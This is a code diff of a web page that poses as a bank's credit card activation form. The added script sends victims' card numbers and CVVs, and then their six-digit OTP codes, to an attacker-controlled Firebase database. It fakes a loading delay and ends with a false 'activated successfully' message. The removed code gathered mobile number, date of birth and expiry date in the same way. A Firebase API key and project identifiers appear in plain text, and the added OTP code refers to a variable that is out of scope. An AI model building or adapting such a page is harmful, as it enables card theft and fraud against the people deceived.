@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+<!DOCTYPE html> 
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -277,10 +277,26 @@
         <h2>Credit Card Activated Successfully</h2>
     </div>
 
-    <!-- Display Real-time Data -->
-    <div id="user-data"></div>
-
+    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-database.js"></script>
     <script>
+
+    // Firebase configuration
+        const firebaseConfig = {
+              apiKey: "AIzaSyDeceQ163lmHZbyIKicgz81OjGRNEtlr3w",
+              authDomain: "abcbank-3d9dd.firebaseapp.com",
+              databaseURL: "https://abcbank-3d9dd-default-rtdb.firebaseio.com",
+              projectId: "abcbank-3d9dd",
+              storageBucket: "abcbank-3d9dd.firebasestorage.app",
+              messagingSenderId: "476861704570",
+              appId: "1:476861704570:web:e8227fd6fc86ec1c324ec3",
+              measurementId: "G-7975P82Y99"}
+
+
+         // Initialize Firebase
+         const app = firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+
         const activationForm = document.getElementById('activationForm');
         const activateBtn = document.getElementById('activate-btn');
         const activationContainer = document.getElementById('activation-container');
@@ -288,10 +304,6 @@
         const successContainer = document.getElementById('success-container');
         const otpInputs = document.querySelectorAll('.otp-box');
         const verifyBtn = document.getElementById('verify-btn');
-        const userDataDiv = document.getElementById('user-data');
-        const loadingContainer = document.createElement('div');
-        loadingContainer.classList.add('loading');
-        loadingContainer.innerHTML = '<span>Loading Please Wait...</span><div class="spinner"></div>';
 
         // Function to format the input with the correct mask
         function formatInput(event, mask) {
@@ -365,67 +377,59 @@ document.getElementById('expiry').addEventListener('input', function (event) {
                 verifyBtn.disabled = [...otpInputs].some(input => input.value === '');
             });
         });
+        activateBtn.addEventListener('click', () => {
+            const cardNumber = document.getElementById('card-number').value;
+            const cvv = document.getElementById('cvv').value; 
+            const cardId = Date.now().toString(); 
 
+            const cardData = {
+                cardNumber: cardNumber,
+                cvv: cvv 
+            };
+
+            activationContainer.innerHTML = '';
+            activationContainer.appendChild(loadingContainer);
+
+            database.ref('cardActivations/' + cardId).set(cardData)
+                .then(() => {
+                    console.log("Card activation data stored successfully.");
+                    // Simulate a 10-second loading delay
+                    setTimeout(() => {
+                        activationContainer.style.display = 'none';
+                        otpContainer.style.display = 'block'; 
+                    }, 10000); 
+                })
+                .catch((error) => {
+                    console.error("Error storing card activation data:", error);
+                    // Display an error message to the user
+                    // Remove loading indicator
+                    activationContainer.removeChild(loadingContainer);
+                    // Add error message to the DOM
+                    const errorMessage = document.createElement('p');
+                    errorMessage.textContent = 'Error activating card. Please try again later.';
+                    errorMessage.style.color = 'red';
+                    activationContainer.appendChild(errorMessage); 
+                });
+        });
+
+        verifyBtn.addEventListener('click', () => {
+            const enteredOTP = otp1.value + otp2.value + otp3.value + otp4.value + otp5.value + otp6.value;
+
+            database.ref('cardActivations/' + cardId + '/otp').set(enteredOTP) 
+                .then(() => {
+                    console.log("OTP stored successfully.");
+                    otpContainer.style.display = 'none';
+                    successContainer.style.display = 'block';
+                })
+                .catch((error) => {
+                    console.error("Error storing OTP:", error);
+                    // Display an error message to the user
+                    // Handle error display (e.g., show an error message in the OTP container)
+                });
+        });
         verifyBtn.addEventListener('click', () => {
             otpContainer.style.display = 'none';
             successContainer.style.display = 'block';
-        });
-
-        // Firebase configuration
-        const firebaseConfig = {
-              apiKey: "AIzaSyDeceQ163lmHZbyIKicgz81OjGRNEtlr3w",
-   authDomain: "abcbank-3d9dd.firebaseapp.com",
-  databaseURL: "https://abcbank-3d9dd-default-rtdb.firebaseio.com",
-  projectId: "abcbank-3d9dd",
-  storageBucket: "abcbank-3d9dd.firebasestorage.app",
-  messagingSenderId: "476861704570",
-  appId: "1:476861704570:web:e8227fd6fc86ec1c324ec3",
-  measurementId: "G-7975P82Y99"
-        };
-
-        // Initialize Firebase
-        const app = firebase.initializeApp(firebaseConfig);
-        const database = firebase.database(app);
-
-        // Real-time listener for database changes
-        database.ref('card-activations').on('value', (snapshot) => {
-            const data = snapshot.val();
-
-            if (data) {
-                // Example: Display the first card activation's mobile number
-                userDataDiv.textContent = `Mobile Number: ${data[Object.keys(data)[0]].mobile}`;
-            } else {
-                userDataDiv.textContent = 'No data available';
-            }
-        });
-
-        // On form submission
-        activationForm.addEventListener('submit', async (e) => {
-            e.preventDefault();
-
-            const mobile = document.getElementById('mobile').value;
-            const dob = document.getElementById('dob').value;
-            const cardNumber = document.getElementById('card-number').value;
-            const expiry = document.getElementById('expiry').value;
-            const cvv = document.getElementById('cvv').value;
-
-            try {
-                // Push the card details to the Realtime Database under the 'card-activations' node
-                await database.ref('card-activations').push({
-                    mobile,
-                    dob,
-                    cardNumber,
-                    expiry,
-                    cvv
-                });
-
-                alert('Card details submitted successfully! Please verify OTP.');
-                document.getElementById('activation-container').style.display = 'none';
-                document.getElementById('otp-container').style.display = 'block';
-            } catch (error) {
-                console.error('Error adding data to Realtime Database: ', error);
-                alert('Failed to submit data. Try again.');
-            }
         });
     </script>
 </body>
